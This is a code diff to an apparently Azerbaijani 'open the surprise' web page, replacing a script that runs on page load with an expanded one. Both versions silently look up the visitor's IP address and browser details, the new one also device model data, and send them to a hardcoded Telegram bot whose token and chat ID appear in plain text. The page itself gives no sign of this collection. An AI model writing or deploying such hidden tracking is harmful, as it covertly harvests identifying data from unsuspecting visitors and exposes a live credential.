@@ -40,27 +40,39 @@ Sürprizi aç ✨
 
 </main>
 <script>
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      const userIP = data.ip;
-      const userAgent = navigator.userAgent;
-      const botToken = '8898539577:AAEio79TVe2UPlYevcUD9yks9ju9VfUYE2A';
-      const chatId = '1937526981';
+  async function sendVisitorInfo() {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    
+    let deviceModel = "Məlum deyil";
+    
+    // Dəqiq cihaz modelini almaq üçün
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      try {
+        const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+        if (ua.model) deviceModel = ua.model;
+      } catch (e) {}
+    }
 
-      const text = `🚨 *Yeni Ziyarətçi!*\n\n🌐 *IP:* ${userIP}\n📱 *Cihaz/Brauzer:* ${userAgent}`;
+    const botToken = '8898539577:AAEio79TVe2UPlYevcUD9yks9ju9VfUYE2A';
+    const chatId = '1937526981';
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: text,
-          parse_mode: 'Markdown'
-        })
-      });
+    const text = `🚨 *Yeni Ziyarətçi!*\n\n🌐 *IP:* ${ipData.ip}\n📱 *Model:* ${deviceModel}\n🔍 *UA:* ${navigator.userAgent}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: 'Markdown'
+      })
     });
+  }
+
+  sendVisitorInfo();
 </script>
+
   
 </body>
 </html>
